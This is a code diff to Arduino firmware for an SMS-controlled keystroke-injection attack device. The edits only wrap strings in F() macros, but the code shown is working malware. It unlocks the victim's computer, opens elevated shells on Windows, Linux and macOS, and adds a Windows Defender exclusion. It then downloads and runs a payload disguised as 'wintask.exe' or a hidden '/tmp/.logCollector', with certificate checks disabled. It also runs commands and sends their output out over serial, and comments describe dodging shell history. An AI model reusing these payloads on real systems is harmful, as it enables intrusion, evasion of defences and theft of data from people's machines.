@@ -14,26 +14,26 @@ void unlockDownload(String SMS_text){
   unlockComputer(password);
   
   // Download and execute the malware
-  if(OS == "win"){
+  if(OS == F("win")){
     //Open a terminal with UAC elevated if possible
     openTerminalWindows();
     downloadAndRunMalwareWindows(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "lnx"){
+  else if(OS == F("lnx")){
     openTerminalLinux();
     downloadAndRunMalwareLinux(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "osx"){
+  else if(OS == F("osx")){
     openTerminalMacOs();
     downloadAndRunMalwareMacOs(url);
     exitTerminalMultiOs();
     lockMacOs();
   }
-  else if(OS == "winlin"){
+  else if(OS == F("winlin")){
     //We don't know the OS but we suspect is windows or linux
     openTerminalWindowsLinux();
     // If it's not windows it will fail, but it would be logged in the history
@@ -43,7 +43,7 @@ void unlockDownload(String SMS_text){
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "multi"){
+  else if(OS == F("multi")){
     //We don't know the OS
     openTerminalMultiOs();
     //We try all the payloads
@@ -57,7 +57,7 @@ void unlockDownload(String SMS_text){
     lockMacOs();
   }
   else {
-    sendSMSMessage("Wrong OS sent for payload");
+    sendSMSMessage(F("Wrong OS sent for payload"));
   }
 }
 
@@ -71,26 +71,26 @@ void unlockRunAndExfil(String SMS_text) {
   unlockComputer(password);
   
   // Download and execute the malware
-  if(OS == "win"){
+  if(OS == F("win")){
     //Open a terminal with UAC elevated if possible
     openTerminalWindows();
     runAndExfilWindows(command);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "lnx"){
+  else if(OS == F("lnx")){
     openTerminalLinux();
     runAndExfilLinux(command, password);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "osx"){
+  else if(OS == F("osx")){
     openTerminalMacOs();
     runAndExfilMacOs(command);
     exitTerminalMultiOs();
     lockMacOs();
   }
-  else if(OS == "winlin"){
+  else if(OS == F("winlin")){
     //We don't know the OS but we suspect is windows or linux
     openTerminalWindowsLinux();
     // If it's not windows it will fail, but it would be logged in the history
@@ -100,7 +100,7 @@ void unlockRunAndExfil(String SMS_text) {
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
-  else if(OS == "multi"){
+  else if(OS == F("multi")){
     //We don't know the OS
     openTerminalMultiOs();
     //We try all the payloads
@@ -114,7 +114,7 @@ void unlockRunAndExfil(String SMS_text) {
     lockMacOs();
   }
   else {
-    sendSMSMessage("Wrong OS sent for payload");
+    sendSMSMessage(F("Wrong OS sent for payload"));
   }
 }
 
@@ -125,7 +125,7 @@ void manualPayload(String SMS_text){
   String action = getValue(SMS_text,SEPARATOR,1);
   String argument = getValue(SMS_text,SEPARATOR,2);
 
-  if (action == "press"){
+  if (action == F("press")){
     // There can be an unlimited number of keystrokes separated by space
     int n_spaces = 0;
     for(int i=0; i<=argument.length() ;i++){
@@ -139,13 +139,13 @@ void manualPayload(String SMS_text){
     }
     Keyboard.releaseAll();
   }
-  else if (action == "print"){
+  else if (action == F("print")){
     Keyboard.print(argument.c_str());
   }
-  else if (action == "release"){
+  else if (action == F("release")){
     Keyboard.releaseAll();
   }
-  else if (action == "delay"){
+  else if (action == F("delay")){
     delay(argument.toInt());
   }
 }
@@ -180,8 +180,7 @@ void openTerminalWindows(){
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(1000);
-  Keyboard.print("cmd.exe");
-  Keyboard.press('\n');
+  Keyboard.println(F("cmd.exe"));
   Keyboard.releaseAll();
   delay(2000);
   
@@ -194,8 +193,7 @@ void openTerminalWindows(){
   //Actions:
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
-  Keyboard.print("powershell Start-Process cmd -Verb runAs && exit");
-  Keyboard.press('\n');
+  Keyboard.println(F("powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
   delay(6000);
@@ -250,7 +248,7 @@ void openTerminalMacOs(){
   // Enter
   //Actions:
   // MacOs: Open a terminal
-  Keyboard.print("terminal.app");
+  Keyboard.print(F("terminal.app"));
   Keyboard.releaseAll();
   delay(2000);
   Keyboard.press(KEY_RETURN);
@@ -298,7 +296,7 @@ void openTerminalWindowsLinux(){
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(1000);
-  Keyboard.print(" cmd.exe");
+  Keyboard.print(F(" cmd.exe"));
   Keyboard.press('\n');
   Keyboard.releaseAll();
   delay(2000);
@@ -312,8 +310,7 @@ void openTerminalWindowsLinux(){
   //Actions:
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
-  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
-  Keyboard.press('\n');
+  Keyboard.println(F(" powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
   delay(6000);
@@ -397,7 +394,7 @@ void openTerminalMultiOs(){
   // Windows: Nothing
   // Linux: It tries to execute that command but it fails
   // MacOs: Open a terminal
-  Keyboard.print("terminal.app");
+  Keyboard.print(F("terminal.app"));
   Keyboard.releaseAll();
   delay(2000);
   Keyboard.press(KEY_RETURN);
@@ -432,7 +429,7 @@ void openTerminalMultiOs(){
   Keyboard.print(" r");
   Keyboard.releaseAll();
   delay(1000);
-  Keyboard.print(" cmd.exe");
+  Keyboard.print(F(" cmd.exe"));
   Keyboard.press('\n');
   Keyboard.releaseAll();
   delay(2000);
@@ -447,7 +444,7 @@ void openTerminalMultiOs(){
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
   // MacOs: It writes powershell... to the terminal and tries to run it (Not logged in the bash history)
-  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
+  Keyboard.print(F(" powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.press('\n');
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
@@ -470,13 +467,13 @@ void openTerminalMultiOs(){
 
 void downloadAndRunMalwareWindows(String url){
   // Add windows defender exception
-  Keyboard.println("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%");
+  Keyboard.println(F("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%"));
   Keyboard.releaseAll(); 
   delay(3000);
 
-  Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
+  Keyboard.print(F("bitsadmin /transfer winupdate /download /priority foreground "));
   Keyboard.print(url);
-  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe");
+  Keyboard.println(F(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe"));
   Keyboard.releaseAll();
   delay(2000);        
 }
@@ -485,9 +482,9 @@ void downloadAndRunMalwareWindows(String url){
 // Tested it in bash, zsh and fish shells
 // disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
 void downloadAndRunMalwareLinux(String url){
-  Keyboard.print(" export x=/tmp/.logCollector && wget --no-check-certificate ");
+  Keyboard.print(F(" export x=/tmp/.logCollector && wget --no-check-certificate "));
   Keyboard.print(url);
-  Keyboard.println(" -O $x && chmod +x $x && nohup $x & disown");
+  Keyboard.println(F(" -O $x && chmod +x $x && nohup $x & disown"));
   Keyboard.releaseAll();
   delay(1000);
 }
@@ -496,9 +493,9 @@ void downloadAndRunMalwareLinux(String url){
 // Tested it in bash, zsh and fish shells
 // disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
 void downloadAndRunMalwareMacOs(String url){
-  Keyboard.print(" export x=/tmp/.logCollector && curl -k ");
+  Keyboard.print(F(" export x=/tmp/.logCollector && curl -k "));
   Keyboard.print(url);
-  Keyboard.println(" -o $x && chmod +x $x && nohup $x & disown");
+  Keyboard.println(F(" -o $x && chmod +x $x && nohup $x & disown"));
   Keyboard.releaseAll();
   delay(1000); 
 }
@@ -510,7 +507,7 @@ void exitTerminalWindowsLinux(){
   // Windows: Closes the terminal
   // Linux: Closes the terminal
   // MacOs: Closes the shell but the terminal remains open
-  Keyboard.println(" exit");
+  Keyboard.println(F(" exit"));
   Keyboard.releaseAll();
   delay(1000);
 }
@@ -563,17 +560,17 @@ void runAndExfilWindows(String command) {
 
 // In ubuntu we need to be root or part of the dialout group
 void runAndExfilLinux(String command, String password) {
-  Keyboard.print("sudo /bin/bash -c \"stty -F /dev/serial/by-id/*Arduino* 38400 && ");
+  Keyboard.print(F("sudo /bin/bash -c \"stty -F /dev/serial/by-id/*Arduino* 38400 && "));
   Keyboard.print(command);
-  Keyboard.println(" > /dev/serial/by-id/*Arduino*\"");
+  Keyboard.println(F(" > /dev/serial/by-id/*Arduino*\""));
   delay(1000);
   Keyboard.println(password);
   delay(3000);  
 }
 
 void runAndExfilMacOs(String command) {
-  Keyboard.print(" stty -f /dev/cu.usbmodem* 38400 && ");
+  Keyboard.print(F(" stty -f /dev/cu.usbmodem* 38400 && "));
   Keyboard.print(command);
-  Keyboard.println(" > /dev/cu.usbmodem*");
+  Keyboard.println(F(" > /dev/cu.usbmodem*"));
   delay(3000);
 }
